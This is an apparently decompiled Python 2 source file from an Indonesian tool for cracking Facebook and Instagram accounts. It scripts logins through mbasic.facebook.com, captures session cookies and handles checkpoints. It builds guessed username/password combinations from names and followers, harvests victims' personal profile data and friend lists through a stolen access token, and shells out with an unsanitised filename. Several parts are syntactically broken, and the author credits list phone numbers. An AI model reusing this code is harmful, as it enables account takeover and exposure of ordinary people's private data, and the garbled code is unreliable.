    ua = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
    ses = requests.Session()
    ses.headers.update({
        'Host': 'mbasic.facebook.com',
        'cache-control': '29-November-2021.txtmax-age=0',
        'upgrade-insecure-requests': '1',
        'origin': mb,
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': mb + '/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
    data = { }
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers = {
        'user-agent': ua }).text, 'html.parser')
    fm = ged.find('form', {
        'method': 'post' })
    list = [
        'lsd',
        'jazoest',
        'm_ts',
        'li',
        'try_number',
        'unrecognized_tries',
        'login',
        'bi_xrwh']
    for _i_ in fm.find_all('input'):
        if _i_.get('name') in list:
            data.update({
                _i_.get('name'): _i_.get('value') })
            continue
            continue
    data.update({
        'email': user,
        'pass': pw })
    
    try:
        run = parser(ses.post(mb + fm.get('action'), data = data, allow_redirects = True).text, 'html.parser')
    except requests.exceptions.TooManyRedirects:
        print '%s redirect overload ' % M

    if 'c_user' in ses.cookies:
        kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
        otw = ses.get(run, cookies = {
            'cookie': kuki })
        gem = parser(otw.content, 'html.parser')
        apk = gem.find('form', method = 'post')
        print '%s[%s+%s]%s Sucess --> %s ' % (B, J, B, P, kuki)
        jeda(0.07)
        _no_ = 0
        for app in apk.find_all('h3'):
            data = app.find('span').text
            _no_ += 1
            jeeck('  %s0%s. %s%s ' % (P, str(_no_), H, data))
        
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {
            'name': 'fb_dtsg' })['value']
        jzst = form.find('input', {
            'name': 'jazoest' })['value']
        nh = form.find('input', {
            'name': 'nh' })['value']
        dataD = {
            'fb_dtsg': dtsg,
            'fb_dtsg': dtsg,
            'jazoest': jzst,
            'jazoest': jzst,
            'checkpoint_data': '',
            'submit[Continue]': 'Lanjutkan',
            'nh': nh }
        sesi = parser(ses.post(mb + form['action'], data = dataD).text, 'html.parser')
        ngew = [ yy.text for yy in sesi.find_all('option') ]
        print '%s%s%s Terdeteksi %s0%s%s options %s ' % (B, til, K, W, str(len(ngew)), O, M)
        jeda(0.07)
        for _o_ in range(len(ngew)):
            jeeck('  %s0%s. %s%s ' % (P, str(_o_ + 1), K, ngew[_o_]))
        
    elif 'login_error' in str(run):
        eror = run.find('div', {
            'id': 'login_error' }).find('div').text
        print '%s+ %s' % (B, eror)
        jeda(0.07)
    else:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Login On Account Eror Or Password On Change')
        jeda(0.07)


def aplikasi(berhasil, kuki):
    a = []
    run = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
    otw = ses.get(run, cookies = {
        'cookie': kuki })
    gem = parser(otw.content, 'html.parser')
    apk = gem.find('form', method = 'post')
    _no_ = 0
    for app in apk.find_all('h3'):
        
        try:
            data = app.find('span').text
            _no_ += 1
            a.append('  %s0%s. %s%s ' % (P, str(_no_), H, data))
        continue
        continue

    


def menu_instagg():
    jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m========================-->\x1b[0;36m MENU INSTAGRAM ')
    print '\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Crack dari followers publik'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Crack dari pencarian nama'
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Chek results'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Log Out'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Back to menu'
    jeeclxnano = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Input : ')
    if jeeclxnano in ('',):
        jeeck('\n\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m INPUT EROR')
        jeda(2)
        exit()
    elif jeeclxnano in ('1', '01'):
        pw = ''
        status = ''
        username = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username target : ')
        ingfo(username, pw, status)
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x9c\xa0\xe2\x95\x90\xe2\x95\xac\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[ JEECK X NANO ]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9c\xa0')
        jeda(2)
        print '\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Followers --> %s ' % str(pengikut)
        print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Follow --> %s ' % str(mengikuti)
        rm = raw_input('\n\n\n\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Input : ')
        limit = input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Limit user : ')
        if rm in ('',):
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Input : ')
        elif rm in ('1', '01'):
            r_ikut(cookie, idg, limit, rm)
            print ''
            proses()
            passxnxx()
        elif rm in ('2', '02'):
            r_ikut(cookie, idg, limit, rm)
            print ''
            proses()
            passxnxx()
        else:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Wronk Input Dear '
            jeda(2)
            menu_instagg()
    elif jeeclxnano in ('2', '02'):
        usr_ = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Masukan nama : ')
        jumlah = input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Limit : ')
        jeeckxnano_2 = usr_.replace(' ', '')
        cr.append('asw_lu')
        mi.append(jeeckxnano_2 + '|' + jeeckxnano_2)
        mi.append(jeeckxnano_2 + '_' + '|' + jeeckxnano_2)
        for _i_ in range(1, jumlah + 1):
            mi.append(jeeckxnano_2 + str(_i_) + '|' + jeeckxnano_2)
            mi.append(jeeckxnano_2 + '_' + str(_i_) + '|' + jeeckxnano_2)
            mi.append(jeeckxnano_2 + str(_i_) + '_' + '|' + jeeckxnano_2)
        
        proses()
        passxnxx()
    elif jeeclxnano in ('3', '03'):
        hasil_igeh()
    elif jeeclxnano in ('04', '4'):
        k = raw_input('\x1b[0;36m[\x1b[0;31m+\x1b[0;36m]\x1b[0;00m Type ,Jeeck, Continue Deleted Account : ')
        if k in ('JEECK', 'jeeck', 'Jeeck'):
            print ''
            s = [
                '.   ',
                '..  ',
                '... ']
            for m in s:
                print '\r\x1b[1;95m\xe2\x95\xb0_\xe2\x95\xaf\x1b[1;96m Deleted Cooooook.......' + m,
                sys.stdout.flush()
                jeda(1)
            
            os.system('rm -rf data/ig.txt')
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Sucess Deleted Coooook......\xe2\x95\xb0_\xe2\x95\xaf')
            exit()
        else:
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Run Tools Doog')
            jeda(2)
    elif jeeclxnano in ('0', '00'):
        menu()
    else:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Input Dooog .........')
        jeda(2)
        menu_instagg()


def author():
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m Pembuat Tools : ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m1. \x1b[0;36mJeeck X Nano ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m2. \x1b[0;36mXnCode ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m3. \x1b[0;36mXxCode ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m4. \x1b[0;36mYayan XD ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m5. \x1b[0;36mRisky / Dumaii ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m Thanks Too : ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m            \x1b[0;36m(\x1b[0;33m1. \x1b[0;36mXnCode ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m            \x1b[0;36m(\x1b[0;33m2. \x1b[0;36mXxCode ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m            \x1b[0;36m(\x1b[0;33m3. \x1b[0;36mYayan XD ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m            \x1b[0;36m(\x1b[0;33m5. \x1b[0;36mRisky / Dumai ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m FOLLOW GITHUB :')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m1. \x1b[0;36mYayan XD')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m+. https://github.com/Yayan-XD')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m2. \x1b[0;36mRisky / Dumaii')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m+. https://github.com/Dumai-991')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m3. \x1b[0;36mJEECK X NANO')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m+. https://github.com/mrjeeck')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;31m DONASI NJEENK :')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               WA : 081392505882')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               FB : Jeeck X Nano')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               PULSA : 085891511849')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               PULSA : 081392505882')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               OPEN BO : xnxx.com')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m  JANGAN LUPA FOLLOW GITHUB AUTHOR')
    raw_input('\n%s[%s+%s] \x1b[0;33m[%s Enter \x1b[0;33m] ' % (B, J, B, U))
    menu()


def panduanxnano():
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m Menu Panduann Penggunaan')
    jeeck('\n\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 1. Tools Ini Terdapat Beberapa Jenis Tools')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 2. Anda Dapat Memilih Salah Satu Menu Tools')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 3. Tools Ini Terdapat Fitur Crcak Instagram')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 4. Dan Juga Ada Fitur Crack Facebook')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 5. Menu Crack Facebook Sangat Banyak Sekali Fitur')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 6. Dari Mulai Segi Dump Public Hingga Dump Group')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 7. Apa Itu Dump Id Public Bang...... ??')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 8. Public Yang Ya Dumpublic Dump Id Orang Secara Random')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 9. Dump Id group Maksudnya apa Bwank.....? Seriusnanya')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 10. Kita Dumpnya Ambil Id Dari Group Dan Kita Dapat MENGOBOKOBOKOBOK RANDOM MEMBER GROUP')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 11. Bang Kalo Menu User Agent Fungsinya Buat Apa .....??')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 12. Kita Dapat Mengganti User-Agent Sesuai Kita  \xf0\x9f\x91\x80 Udah Tau Bang')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 13. Agent adalah proses mengakui dan menganalisis string agen pengguna untuk mengenali properti string.')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 14. \xf0\x9f\x91\x80 Bang Kalo Ganti User Agent Itu Dapat One Tap Kahh')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 15. Belum Tentu Onetap ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 16. Bang Cara Onetap Bagaimana SAYA MAU PAMER')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 17. 1.Dump Id Yang Temanya Sedaerah Dengan Lu')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 18. 2.Baca Bismillah Terlebih Dahulu')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 19. 3.Pada Saat Mau Buka Sesi Usahakan Anda Mempunyai 2 SIM')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 20. 4.Semisal Lu Pada Saat Crack Pake Sim1 Terus Lubuka Sesi Pake Sim 2')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 21. 5.Bang Masih Kagak Bisa ....??? .\xc2\xb7\xc2\xb4\xc2\xaf`(>\xe2\x96\x82<)\xc2\xb4\xc2\xaf`\xc2\xb7.')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 22. 6.Pake Methode Ganti Apn ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 23. 7.Bang Apn Dapet Nya Darimana...???\xef\xbd\xa5\xef\xbe\x9f\xef\xbe\x9f\xef\xbd\xa5(>\xd0\xb4<)\xef\xbd\xa5\xef\xbe\x9f\xef\xbe\x9f\xef\xbd\xa5')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 24. 8.Cari Di Google Banyak')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 25. 9.Bang Kegunaan Apn Untuk Apa')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 25. 10.fungsi APN adalah untuk menyambungkan device dengan operator penyedia layanan internet.')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 26. 11.Bang Lu Recode Ya NGGAK KO Hehehe ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 27. 12.Bang Kok Methode Mbasic Kek Punya YayanXD ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 28. 13.Oh Itu Emang Gwe Izin Ke YayanXD Ambil.Cuplikan Methode MBASIC')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 29. 14.Sama Aja Lu Recode Bwank ....? ENGGAK KOK HAL INI SAYA SEBUT KERJA SAMA')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 30. 15.Methode B-Api Yang Buat Sya , Mbasic Yang Buat YayanXD, Mobile FB Yang Buat RISKY/SUHU DUMAII')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 31. 16.Oooh Begitu Ya Bang.... Iyaa')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m 32. 17.Iyaa Bwank BTW MAKASIH UDAH PAKE TOOLS.SAYA')
    raw_input('\n%s[%s+%s] \x1b[0;33m[%s Enter \x1b[0;33m] ' % (B, J, B, U))
    menu()


def cek_ingfo(purel):
    
    try:
        jeeckxd = open('data/token.txt', 'r').read()
    except IOError:
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Token modar di nggo wae')
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()
        user = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Masukan id : ')
        if user == '':
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan kosong bro:')
            cek_ingfo(purel)
        url = 'https://lookup-id.com/'
        if 'facebook' in user:
            payload = {
                'fburl': user,
                'check': 'Lookup' }
        else:
            payload = {
                'fburl': 'https://free.facebook.com/' + user,
                'check': 'Lookup' }
    halaman = requests.post(url, data = payload).text.encode('utf-8')
    sop_ = BeautifulSoup(halaman, 'html.parser')
    email_ = sop_.find('span', id = 'code')
    idt = email_.text
    if user == 'me':
        idt = 'me'
    x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s' % (idt, purel)).json()
    nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s' % (M, N)

    jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Ingformasi akun detected ')
    jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama lengkap : %s ' % nmaa)
    
    try:
        ndpn = x['first_name']
    except (KeyError, IOError):
        ndpn = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama depan : %s' % ndpn)
    
    try:
        nmbl = x['last_name']
    except (KeyError, IOError):
        nmbl = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama belakang : %s ' % nmbl)
    
    try:
        hwhs = x['username']
    except (KeyError, IOError):
        hwhs = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Username fb : %s ' % hwhs)
    
    try:
        asu = x['id']
    except (KeyError, IOError):
        asu = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id facebook : %s ' % asu)
    jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Data-data akun facebook')
    
    try:
        emai = x['email']
    except (KeyError, IOError):
        emai = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Gmail : %s ' % emai)
    
    try:
        nmrr = x['mobile_phone']
    except (KeyError, IOError):
        nmrr = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nomor telepon : %s ' % nmrr)
    
    try:
        ttll = x['birthday']
        (month, day, year) = ttll.split('/')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
        year = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Tanggal lahir : %s %s %s ' % (day, month, year))
    
    try:
        jenis = x['gender'].replace('female', 'Perempuan').replace('male', 'Laki-laki')
    except (KeyError, IOError):
        jenis = ''

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jenis kelamin : %s' % jenis)
    
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s' % (idt, purel))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:
        pass

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m jumblah pertemanan : %s ' % str(len(id)))
    
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (idt, purel))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total followers : %s ' % pengikut)
    
    try:
        lins = x['link']
    except (KeyError, IOError):
        lins = '%s-%s' % (M, N)

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Link facebook : %s ' % lins)
    
    try:
        stas = x['relationship_status']
    except (KeyError, IOError):
        stas = '%s-%s' % (M, N)

    
    try:
        dgn = 'dengan %s' % x['significant_other']['name']
    except (KeyError, IOError):
        dgn = '%s-%s' % (M, N)
    except:
        pass

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Setatus hubungan : %s %s ' % (stas, dgn))
    
    try:
        bioo = x['about']
    except (KeyError, IOError):
        bioo = '%s-%s' % (M, N)
    except:
        pass

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Tentang setatus : %s ' % bioo)
    
    try:
        dari = x['hometown']['name']
    except (KeyError, IOError):
        dari = '%s-%s' % (M, N)
    except:
        pass

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Kota asal : %s ' % dari)
    
    try:
        tigl = x['location']['name']
    except (KeyError, IOError):
        tigl = '%s-%s' % (M, N)
    except:
        pass

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Tinggal di : %s ' % tigl)
    raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
    menu()


def chek_crackyou():
    l = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Input : ')
    if l in ('',):
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m WRONK INPUT')
        jeda(2)
        menu()
    elif l in ('1', '01'):
        dirs = os.listdir('OK')
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results crack '
        for file in dirs:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m __/--> %s ' % file
        
        
        try:
            file = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama file : ')
            jeda(0.2)
            if file in ('',):
                exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Input Asuu Celeng')
            totalok = open('OK/%s' % file).read().splitlines()
        except (KeyError, IOError):
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m File No Detected Njenk ')

        nm_file = ('%s' % file).replace('-', ' ')
        file_nm = nm_file.replace('.txt', '')
        jeeck('\x1b[0;36m[\x1b[0;33m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
        jeda(2)
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total hasil --> %s ' % len(totalok)
        jeeck('\x1b[0;36m[\x1b[0;33m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
        jeda(2)
        os.system('cat OK/%s' % file)
        jeeck('\x1b[0;36m[\x1b[0;33m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
        jeda(2)
        exit('\n')
    elif l in ('2', '02'):
        dirs = os.listdir('CP')
        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total hasil yang tersimpan'
        for file in dirs:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m --> %s ' % file
        
        
        try:
            file = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama file : ')
            jeda(0.2)
            if file in ('',):
                exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Input Asu Ngentod Babi')
            totalcp = open('CP/%s' % file).read().splitlines()
        except (KeyError, IOError):
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m File Not Detected')

        nm_file = ('%s' % file).replace('-', ' ')
        file_nm = nm_file.replace('.txt', '')
